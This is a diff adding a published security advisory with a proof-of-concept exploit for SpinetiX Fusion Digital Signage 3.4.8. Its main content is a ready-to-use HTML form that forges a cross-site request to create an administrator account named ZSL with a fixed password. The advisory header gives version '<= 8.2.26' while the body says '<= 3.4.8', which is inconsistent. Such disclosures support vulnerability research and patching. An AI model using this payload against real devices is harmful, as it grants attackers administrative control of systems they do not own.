@@ -1,0 +1,57 @@
+# Exploit Title: SpinetiX Fusion Digital Signage 3.4.8 - Cross-Site Request Forgery (Add Admin)
+# Date: 2020-09-30
+# Exploit Author: LiquidWorm
+# Vendor Homepage: https://www.spinetix.com
+# Version: <= 8.2.26
+
+SpinetiX Fusion Digital Signage 3.4.8 CSRF Add Admin Exploit
+
+
+Vendor: SpinetiX AG
+Product web page: https://www.spinetix.com
+Affected version: <= 3.4.8 (1.0.36274)
+
+Summary: At SpinetiX we inspire businesses to unlock the potential of their story.
+We believe in the power of digital signage as a dynamic new storytelling platform
+to engage with people. For more than 13 years, we have been constantly innovating
+to deliver cutting-edge digital signage solutions that help our customers shine.
+Fusion is a built-in content management application accessible from a standard web
+browser - it is pre-installed on every HMP200, HMP130, and HMP100 device, and does
+not require any additional license, cost, or software installation.
+
+Desc: The application interface allows users to perform certain actions via HTTP
+requests without performing any validity checks to verify the requests. This can
+be exploited to perform certain actions with administrative privileges if a logged-in
+user visits a malicious web site.
+
+Tested on: Apache 2.2.34
+           PHP/5.3.18-2
+           Linux 2.6.10
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2020-5592
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5592.php
+
+
+03.08.2020
+
+--
+
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/index.php?r=settings/settings')</script>
+    <form action="http://192.168.1.1/fusion/index.php?r=users/create" method="POST">
+      <input type="hidden" name="User[username]" value="" />
+      <input type="hidden" name="User[username]" value="ZSL" />
+      <input type="hidden" name="User[new_password]" value="testingus" />
+      <input type="hidden" name="User[repeat_password]" value="testingus" />
+      <input type="hidden" name="User[userRoles]" value="Administrator" />
+      <input type="submit" value="Forge!" />
+    </form>
+  </body>
+</html>
